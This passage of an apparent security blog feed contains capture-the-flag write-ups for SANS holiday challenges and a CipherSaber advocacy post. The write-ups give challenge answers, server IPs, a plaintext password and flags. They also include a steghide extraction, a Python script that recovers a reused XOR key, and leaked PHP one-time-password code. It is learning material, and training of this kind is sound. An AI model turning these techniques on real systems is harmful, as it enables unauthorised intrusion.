Its CPU architecture is 32-bit ARM. The web interface is built
with NodeJS, with Jade Node as the template engine.&lt;/p&gt;
&lt;ol class="arabic simple" start="4"&gt;
&lt;li&gt;What kind of a database engine is used to support the Gnome web
interface? What is the plaintext password stored in the Gnome database?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The database engine is MongoDB. The plaintex password is
&lt;code&gt;SittingOnAShelf&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="5"&gt;
&lt;li&gt;What are the IP addresses of the five SuperGnomes scattered around the
world, as verified by Tom Hessman in the Dosis neighborhood?&lt;/li&gt;
&lt;li&gt;Where is each SuperGnome located geographically?&lt;/li&gt;
&lt;/ol&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;SuperGnome01: 52.2.229.189, located in United States, Ashburn (VI)&lt;/li&gt;
&lt;li&gt;SuperGnome02: 52.34.3.80, located in United States, Portland (OR)&lt;/li&gt;
&lt;li&gt;SuperGnome03: 52.64.191.71, located in Australia, Sydney&lt;/li&gt;
&lt;li&gt;SuperGnome04: 52.192.152.132, located in Japan, Tokyo&lt;/li&gt;
&lt;li&gt;SuperGnome05: 54.233.105.81, located in Brazil, Sao Paulo&lt;/li&gt;
&lt;/ul&gt;
&lt;ol class="arabic simple" start="7"&gt;
&lt;li&gt;Please describe the vulnerabilities you discovered in the
Gnome firmware.&lt;/li&gt;
&lt;li&gt;Describe the technique you used to gain access to each SuperGnome’s
gnome.conf file.&lt;/li&gt;
&lt;/ol&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;SuperGnome01: Credentials stored in plaintext. Reuse of credentials.&lt;/li&gt;
&lt;li&gt;SuperGnome02: Arbitrary folder creation. Local file inclusion.&lt;/li&gt;
&lt;li&gt;SuperGnome03: NoSQL injection&lt;/li&gt;
&lt;li&gt;SuperGnome04: Server Side JavaScript injection&lt;/li&gt;
&lt;li&gt;SuperGnome05: Buffer-overflow&lt;/li&gt;
&lt;/ul&gt;
&lt;ol class="arabic simple" start="9"&gt;
&lt;li&gt;Based on evidence you recover from the SuperGnomes’ packet capture ZIP
files and any staticky images you find, what is the nefarious plot of
ATNAS Corporation?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The plot of the ATNAS Corporation is to sell millions of Gnomes to families,
so that they can identify valuable objects, and then come and steal it during
Christmas night, by disguising themselves as Santy Claus.&lt;/p&gt;
&lt;ol class="arabic simple" start="10"&gt;
&lt;li&gt;Who is the villain behind the nefarious plot?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The villain is none other that
&lt;a class="reference external" href="http://seuss.wikia.com/wiki/Cindy_Lou_Who"&gt;Cindy Lou Who&lt;/a&gt;. After being
traumatised by the Grinch stealing Christmas, she has developped a deep
hatred for this holiday.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="conclusion"&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;I really enjoyed doing this challenge, because it allowed me to develop
my skills in technologies I'm not familiar with, such as NoSQL database
engines, or buffer-overflow (something I should really work on).&lt;/p&gt;
&lt;p&gt;Many thanks to the SANS institute for this incredible Christmas Challenge!&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>May the Cipher be with you</title><link href="https://allyourbase.utouch.fr/posts/2013/02/03/may-the-cipher-be-with-you/" rel="alternate"></link><updated>2013-02-03T01:42:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2013-02-03:posts/2013/02/03/may-the-cipher-be-with-you/</id><summary type="html">&lt;img alt="ciphersaber-logo.png" class="align-center" src="/images/may-the-cipher-be-with-you/ciphersaber-logo.png" /&gt;
&lt;p&gt;NB: I know that implementing cryptographic algorithms yourself is
dangerous. There are many implementation problems people won't think
about, like memory management. I just wanted to talk about the
CipherSaber because I think it's an old, yet neat project. I think it's
important to sensitize people about cryptography and the regulations
around its usage. &lt;strong&gt;If you want to use cryptography to protect your
privacy, I suggest you look at a more serious project like PGP.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A few months ago, while checking my RSS feeds, I saw &lt;a class="reference external" href="http://www.reddit.com/r/netsec/comments/10d7zb/are_there_any_inprogress_opensource_cryptography/"&gt;this discussion&lt;/a&gt;
on Reddit. Since I love cryptography and FLOSS, I looked at the comment
section, to see what kind of answers were posted.&lt;/p&gt;
&lt;p&gt;One comment caught my attention:&lt;/p&gt;
&lt;img alt="ciphersaber-comment.png" class="align-center" src="/images/may-the-cipher-be-with-you/ciphersaber-comment.png" /&gt;
&lt;p&gt;What intrigued me was the idea of creating your own &amp;quot;something&amp;quot; (plus,
the &amp;quot;something&amp;quot; had a really cool name), and I also like the fact that I
could start right away.&lt;/p&gt;
&lt;p&gt;So, I went to the &lt;a class="reference external" href="http://ciphersaber.gurus.org/"&gt;CipherSaber&lt;/a&gt; web
page, to see what's what. And, being the privacy advocate that I am, I
was not disappointed. The CipherSaber is a form of protest against US
ban on cryptography.&lt;/p&gt;
&lt;p&gt;It was written after 9/11, when the US government wanted to limit the
use/publication of cryptography, in order to prevent the terrorists from
using it. It's, of course, a ridiculous idea, since the crypto is
&lt;em&gt;already&lt;/em&gt; out there, and anybody can use it, even the terrorists: it's
a little too late to try to prevent cryptography export. Plus, as stated
in the CipherSaber web page, nothing would prevent terrorists to send
some of their members to US universities to learn cryptography, as they
do to learn chemistry, nuclear engineering etc.&lt;/p&gt;
&lt;p&gt;As my good friend (okay, we've never met, but still, he has a point)
Philip Zimmermann said:&lt;/p&gt;
&lt;blockquote&gt;
If privacy is outlawed, only outlaws will have privacy.&lt;/blockquote&gt;
&lt;p&gt;The idea behind the CipherSaber, is to have everyone implementing a
strong crypto algorithm, so that people don't rely on products that can
be banned. The chosen algorithm is the stream cipher RC4, because it's
strong, and easy to implement (see CipherSaber-2 in the web page to
correct a known vulnerability in RC4). The name CipherSaber comes from
Star Wars, because every Jedi knight has to build its own light saber,
just like every CipherKnight should implement its own CipherSaber.&lt;/p&gt;
&lt;p&gt;I know I'm not from the US, and I know this web page was written ten
years ago, but I like the idea of being a part of some community, and
Internet ban concern everyone. That's why I've decided to revamp the
CipherKnight's certificate (the old one, in addition to being hard to
find, is too directed towards Americans).&lt;/p&gt;
&lt;p&gt;All you have to do to get your certificate is to enter your name, click
the button, and decipher it using your own CipherSaber (the encryption
key is &lt;em&gt;AlanTuring&lt;/em&gt;).&lt;/p&gt;
&lt;form action="/cscertificate/index.php" method="post"&gt;
     &lt;label for="name"&gt;Name&lt;/label&gt;: &lt;input name="name" type="text"&gt; &lt;input value="Get your certificate!" type="submit"&gt;
&lt;/form&gt;&lt;p&gt;If you're old school, you can get the former CipherKnight's certificate
&lt;a class="reference external" href="https://allyourbase.utouch.fr/wp-content/uploads/2014/08/cknight.cs1"&gt;here&lt;/a&gt;
(the encryption key is &lt;em&gt;ThomasJefferson&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;So go ahead, forge your own CipherSaber, print out your certificate, and
spread the word.&lt;/p&gt;
&lt;p&gt;May the Cipher be with you.&lt;/p&gt;
</summary></entry><entry><title>SANS Christmas Challenge 2012</title><link href="https://allyourbase.utouch.fr/posts/2013/01/07/sans-christmas-challenge-2012/" rel="alternate"></link><updated>2013-01-07T12:20:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2013-01-07:posts/2013/01/07/sans-christmas-challenge-2012/</id><summary type="html">&lt;img alt="sans_christmas_challenge_2012_logo.jpg" class="align-center" src="/images/sans-christmas-challenge-2012/sans_christmas_challenge_2012_logo.jpg" /&gt;
&lt;p&gt;During December, SANS posted a &lt;a class="reference external" href="http://pen-testing.sans.org/holiday-challenge/2012"&gt;Christmas
challenge&lt;/a&gt; based
on a Christmas story.&lt;/p&gt;
&lt;p&gt;This year, Santa is sad because he feels that nobody believes in him
anymore, so he decides to cancel Christmas. Mrs. Claus wants to cheer
her husband up, in order not to let children down, but her reindeer gets
imprisoned in Southtown's dog pound. The mayor accepts to let Vixen, the
reindeer, go if Mrs. Claus can make it snow in Southtown, which is a
relatively hot region.&lt;/p&gt;
&lt;p&gt;So Mrs. Claus goes to see Snow Miser, who is in charge of the cold
weather. Unfortunately, he refuses to make it snow in Southtown, because
it's in his brother's, Heat Miser, territory. But Heat Miser agrees to
make it snow in Southtown as long as he's allowed to melt the North
Pole. Unfortunately, the brothers are too stubborn, and refuse to let
each other have control over the other's territory. So Mrs. Claus takes
it to a higher authority: Mother Nature, who forces the brothers to
cooperate.&lt;/p&gt;
&lt;p&gt;Since they have to collaborate, Snow Miser and Heat Miser decide to
have a little fun and make it a competition: they both have to hack
every level of the other brother's weather control. You can follow
&lt;a class="reference external" href="https://twitter.com/sn0w_m1s3r"&gt;&amp;#64;sn0w_m1s3r&lt;/a&gt; and
&lt;a class="reference external" href="https://twitter.com/h34t_m1s3r"&gt;&amp;#64;h34t_m1s3r&lt;/a&gt; on Twitter.&lt;/p&gt;
&lt;p&gt;To make things interesting, SANS posted six questions, and will
reward the best answers:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Where did you find the remainder of Snow Miser's Zone 1 URL?&lt;/li&gt;
&lt;li&gt;What is the key you used with steghide to extract Snow Miser's Zone 2
URL? Where did you find the key?&lt;/li&gt;
&lt;li&gt;On Snow Miser's Zone 3 page, why is using the same key multiple times
a bad idea?&lt;/li&gt;
&lt;li&gt;What was the coding error in Zone 4 of Heat Miser's site that allowed
you to find the URL for Zone 5?&lt;/li&gt;
&lt;li&gt;How did you manipulate the cookie to get to Zone 5 of Heat Miser's
Control System?&lt;/li&gt;
&lt;li&gt;Please briefly describe the process, steps, and tools you used to
conquer each zone, including all of the flags hidden in the comments
of each zone page.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;I'll focus on the sixth question, while answering the first questions in
my write up.&lt;/p&gt;
&lt;div class="section" id="snow-miser"&gt;
&lt;h2&gt;&lt;a class="reference external" href="http://snowmiser.counterhack.com/"&gt;Snow Miser&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="zone-0"&gt;
&lt;h3&gt;Zone 0&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;3b5a630fc67251aa5555f4979787c93f&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Unlike my brother, my fridged minions (without freakish hair) didn't
mess up and leak our URLs to search engines or have to block them
from the search engines. There is no vulnerability to get to the
next zone and you will not find a vulnerability here. Move along.&lt;/p&gt;
&lt;p&gt;Those of you with proper access, the URL you need starts with the
following:&lt;/p&gt;
&lt;p&gt;zone-1-D2E31380-50E6-4869-8A85-XXXXXXXXXXXX&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The URL is composed only of digits (0 through 9) and letters (A through
F), which gives us 281.474.976.710.656 possible combinations. We can't
bruteforce so many combinations (plus, it's explicitly stated in the
challenge's rules that bruteforce is disallowed).&lt;/p&gt;
&lt;p&gt;Fortunately, Snow Miser tweets this message:&lt;/p&gt;
&lt;img alt="snow_miser_tweet_1.png" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_tweet_1.png" /&gt;
&lt;p&gt;Here's the posted image:&lt;/p&gt;
&lt;img alt="snow_miser_glass_reflection.jpg" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_glass_reflection.jpg" /&gt;
&lt;p&gt;We can see in the something interesting in the screen's reflection in
the glass: the end of the URL we're looking for. With a tool like GIMP,
we can manipulate the image to make it easier to read it:&lt;/p&gt;
&lt;img alt="snow_miser_glass_reflection_enhanced.jpg" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_glass_reflection_enhanced.jpg" /&gt;
&lt;p&gt;Which gives us this final URL:
zone-1-D2E31380-50E6-4869-8A85-F9CDB3AF6226&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-1"&gt;
&lt;h3&gt;Zone 1&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;38bef0b61ba8edda377b626fe6708bfa&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
One of my minions, who has been turned into a snowman, messed up and
changed the URL for Zone 2. If you have access to this level you can
analyze the images and access the next zone.&lt;/blockquote&gt;
&lt;p&gt;This message kind of points to some sort of steganography use. This is
where the second question helps us. We know the program steghide was
used on a image. While looking at the website's images, we can see that
they're all PNG, except for &lt;a class="reference external" href="/images/sans-christmas-challenge-2012/off.jpg"&gt;this
one&lt;/a&gt;,
which is JPG. Since steghide doesn't support PNG, we know that the URL
is hidden in the last image.&lt;/p&gt;
&lt;p&gt;Now, we need to find the key, in order to extract the hidden file. If
you open the image in a hexadecimal editor, you'll find an ASCII string,
&amp;quot;IceIceBaby!&amp;quot;. Let's use it as the key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;steghide extract -sf off.jpg
Enter passphrase: IceIceBaby!
Extracted data written to tmpfile.txt
&lt;span class="nv"&gt;$ &lt;/span&gt;cat tmpfile.txt
zone-2-6D46A633-25D7-42C8-AF94-8E786142A3E3
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-2"&gt;
&lt;h3&gt;Zone 2&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;b8231c2bac801b54f732cfbdcd7e47b7&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The same minion that messed up the Zone 2 link also messed up the
Zone 3 link. Make sure you use the new link that starts with:&lt;/p&gt;
&lt;p&gt;zone-3-EAB6B031-4EFA-49F1-B542-XXXXXXXXXXXX&lt;/p&gt;
&lt;p&gt;Please do not tweet the links or parts of the links.&lt;/p&gt;
&lt;p&gt;All security issues that used to allow access to the next zone have
been fixed. There is no vulnerability to get to the next zone and
you will not find a vulnerability here. Move along.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Heat Miser kindly tweets:&lt;/p&gt;
&lt;img alt="heat_miser_tweet_2.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_tweet_2.png" /&gt;
&lt;p&gt;You can retrieve Snow Miser's data
&lt;a class="reference external" href="/docs/sans-christmas-challenge-2012/android.data_.tar.gz"&gt;here&lt;/a&gt;
(sha256:
&lt;code&gt;286387c77b533aae4d605d85a5e74c819f3e0ca7ca42b991ddd29abf9ff5a6b4&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;After extracting it, we can use some shell mojo to find files mentioning
the zone 3 URL:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tar -xzvf android.data.tgz
&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;cd &lt;/span&gt;data
&lt;span class="nv"&gt;$ &lt;/span&gt;grep -Rn &lt;span class="s2"&gt;&amp;quot;zone-3&amp;quot;&lt;/span&gt; . 2&amp;gt; /dev/null
Binary file ./data/com.android.browser/cache/browser_state.parcel
concordant
Binary file
./data/com.android.browser/cache/webviewCacheChromium/data_1 concordant
Binary file
./data/com.android.browser/cache/webviewCacheChromium/data_2 concordant
Binary file ./data/com.android.browser/databases/browser2.db
concordant
Binary file ./data/com.android.browser/databases/browser2.db-wal
concordant
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The first file looks is a browser cache file, which may contain the
wanted URL. By reading it, we'll find:
zone-3-EAB6B031-4EFA-49F1-B542-30EBE9EB3962&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-3"&gt;
&lt;h3&gt;Zone 3&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;08ba610172aade5d1c8ea738013a2e99&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;To reduce the impact of URL exposure or modification we have added a
new mechanism to distribute changes to the URL (thanks to that
minion that broke Zones 2+). Those of you with with access to Zone 4
should have received an encryption key. This key can be used to
decrypt the URL for Zone 4. This allows us to securely communicate
it to you without risk of unauthorized access.&lt;/p&gt;
&lt;p&gt;To verify your key you can check the previous Zone 4 URL:&lt;/p&gt;
&lt;p&gt;zone-4-F7677DA8-3D77-11E2-BB65-E4BF6188709B&lt;/p&gt;
&lt;p&gt;20d916c6c29ee53c30ea1effc63b1c72147eb86b998a25c0cf1bf66939e8621b3132d83abb1683df619238&lt;/p&gt;
&lt;p&gt;The new Zone 4 encrypted string is:
20d916c6c29ee54343e81ff1b14c1372650cbf19998f51b5c51bf66f49ec62184034a94fc9198fa9179849&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We know the cipher texts both encrypt plain texts starting with zone-4-,
and by looking at them, we can see that they both start with the same
letters. It hints to a bytewise encryption scheme. It turns out that
it's a XOR encryption. The first &amp;quot;oops&amp;quot; here, is that since we're given
a plain text and its cipher text, we can recover the whole key. Indeed,
by the propriety of the XOR operator (here denoted by &lt;span class="formula"&gt;⊕&lt;/span&gt;):&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;span class="formula"&gt;&lt;i&gt;c&lt;/i&gt; = &lt;i&gt;k&lt;/i&gt;⊕&lt;i&gt;p&lt;/i&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class="formula"&gt;&lt;i&gt;c&lt;/i&gt;⊕&lt;i&gt;p&lt;/i&gt; = &lt;i&gt;k&lt;/i&gt;⊕&lt;i&gt;p&lt;/i&gt;⊕&lt;i&gt;p&lt;/i&gt; = &lt;i&gt;k&lt;/i&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The second &amp;quot;oops&amp;quot; is using the same key twice, because now that we have
the key, we can decrypt the second cipher text:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class="c"&gt;#-*- encoding: Utf-8 -*-&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;usage: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt; &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;

    &lt;span class="n"&gt;plain1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cipher1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cipher2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;
    &lt;span class="n"&gt;plain2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plain1&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
        &lt;span class="n"&gt;plain2&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plain1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipher1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipher2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;plain2&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now let's launch this program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ls
xor_encrypt.py
&lt;span class="nv"&gt;$ &lt;/span&gt;./xor_enc.py zone-4-F7677DA8-3D77-11E2-BB65-E4BF6188709B
20d916c6c29ee53c30ea1effc63b1c72147eb86b998a25c0cf1bf66939e8621b3132d83abb1683df619238
20d916c6c29ee54343e81ff1b14c1372650cbf19998f51b5c51bf66f49ec62184034a94fc9198fa9179849
zone-4-9D469367-B60E-4E08-BDF1-FED7CC74AF33
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-4"&gt;
&lt;h3&gt;Zone 4&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;de32b158f102a60aba7de3ee8d5d265a&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Zone 5 requires top security. We are updating the code using svn 1.7
and have implemented One-Time-Password (OTP) functionality to access
Zone 5.&lt;/p&gt;
&lt;p&gt;The passwords are in a SHA1 format, so they are unguessable.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If we look at the source code, we can see that the One Time Password is
sent to the zone 5 URL, so we don't have to look very far to find it.
But if we try to access it directly, we're redirected to a page,
noaccess.php. With this tweet, Heat Miser gives us a big hint:&lt;/p&gt;
&lt;img alt="heat_miser_tweet_3.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_tweet_3.png" /&gt;
&lt;p&gt;By looking at &lt;a class="reference external" href="http://pen-testing.sans.org/blog/pen-testing/2012/12/06/all-your-svn-are-belong-to-us"&gt;the tutorial he
gives&lt;/a&gt;
(see, this meme doesn't get old!) we can get the index page source code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;generate_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$time&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;$time&lt;/span&gt;&lt;span class="s2"&gt; 7998f77a7dc74f182a76219d7ee58db38be3841c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$pass&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;verify_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$inpass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// passwords are valid for up to 3 minutes&lt;/span&gt;
        &lt;span class="c1"&gt;// don&amp;#39;t forget to use the server time (see the noaccess.php page)&lt;/span&gt;
        &lt;span class="nv"&gt;$validstamps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;strtotime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;+1 minute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt; &lt;span class="c1"&gt;// added just in case the time sync is off&lt;/span&gt;
            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;strtotime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-1 minute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;strtotime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-2 minute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
        &lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$validstamps&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;$stamp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;strtolower&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$inpass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;generate_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$stamp&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
